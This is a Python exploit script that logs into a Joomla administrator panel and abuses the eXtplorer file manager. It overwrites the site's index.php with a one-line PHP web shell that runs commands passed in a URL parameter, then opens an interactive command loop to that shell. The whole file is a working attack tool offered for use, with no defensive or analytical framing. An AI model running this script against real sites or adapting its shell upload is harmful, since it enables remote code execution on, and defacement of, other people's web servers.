#!/usr/bin/python3

from pwn import *
from sys import exit
import requests
import hashlib

class ExploitExtplorer:

    def __init__(self,url,username,password):
        self.url = url
        self.username = username
        self.password = password
        self.session = None
        

    def validate_url(self):
        if "administrator/" in self.url:
            self.url = (self.url).strip('administrator/')
        else:
            pass

    def login_joomla(self):
        log.progress("Trying to login...")
        session = requests.Session()
        response = session.get(self.url + "/administrator/")
        cookies = response.cookies.get_dict()
        data = {
                'username':self.username,
                'passwd':self.password,
                'option':'com_login',
                'task':'login'
                }
        for inputs in (response.text).split('\n'):
            if 'name="return"' in inputs:
                data['return'] = (inputs.split('value="')[1].split('"')[0])
            elif 'value="1"' in inputs:
                data[(inputs.split('name="')[1].split('"')[0])] = '1'
        try:
            login = session.post(self.url+"/administrator/",data=data,cookies=cookies)
        except:
            failure("URL is not accessible!")
            exit()
        if "Edit Account" in login.text:
            log.progress("Login Successful!")
            self.session = session
        else:
            failure("Login Failed!")
            print("Check your credentials!")
            exit()

    def upload_shell(self):
        log.progress("Uploading webshell")
        session = self.session    
        cookies = (session.cookies.get_dict())
        _,sessionid = next(iter(cookies.items()))
        hash_object = hashlib.md5(sessionid.encode())
        token_value = hash_object.hexdigest()
        
        data = {
                "option":"com_extplorer",
                "action":"edit",
                "dir":"",
                "code":'<?=`$_GET[0]`?>',
                "item":"index.php",
                "dosave":"yes",
                "token":token_value,
                "fname":"index.php"
                }
        response = session.post(self.url + '/administrator/index.php',data=data,cookies=cookies)
        log.progress(f"Shell has been successfully uploaded to {self.url}/index.php?0=id")

    def exec_cmd(self):
        session = self.session
        url = self.url
        try:
            success("Spawned a shell!")
            while True:
                cmd = input("$ ")
                if cmd.strip() == 'exit' or cmd.strip() == 'quit':
                    break
                else:
                    response = session.get(self.url + f"/index.php?0={cmd}")
                    print(response.text)
        except KeyboardInterrupt:
            print("Exiting...")
            exit()


if __name__ == "__main__":
    if len(sys.argv) != 4:
        # Add function that handles arguments here
        log.failure(f"Usage: {sys.argv[0]} url username password")
        exit()

    if len(sys.argv) == 4:
        exploit = ExploitExtplorer(sys.argv[1],sys.argv[2],sys.argv[3])
    
    exploit.validate_url()
    exploit.login_joomla()
    exploit.upload_shell()
    exploit.exec_cmd()

